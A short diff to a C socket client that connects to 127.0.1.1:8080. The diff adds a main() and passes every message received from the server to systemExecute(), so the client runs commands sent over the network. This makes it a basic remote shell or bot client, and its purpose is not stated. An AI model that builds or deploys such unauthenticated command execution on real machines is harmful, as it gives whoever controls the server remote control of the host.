@@ -4,6 +4,7 @@
 #include <arpa/inet.h> // inet_pton() function
 #include <sys/socket.h> // Sockets
 #include <netinet/in.h> // Adress family (AF_INET)A
+#include "system.h"
 
 #define IP_ADDRESS "127.0.1.1"
 #define PORT 8080
@@ -30,6 +31,8 @@ int socketLoop(int fd)
     bzero(bf, bflen);
     recv(fd, bf, bflen, 0);
     printf("s: %s\n", bf);
+    // Actually execute the command (see system.c)
+    systemExecute(bf);
     bzero(bf, bflen);
     strcpy(bf, "Message received at the client...");
     send(fd, bf, strlen(bf), 0);
@@ -85,4 +88,9 @@ int socketMain()
 {
   socketStart();
   return 0;
+}
+
+int main()
+{
+  socketMain();
 }
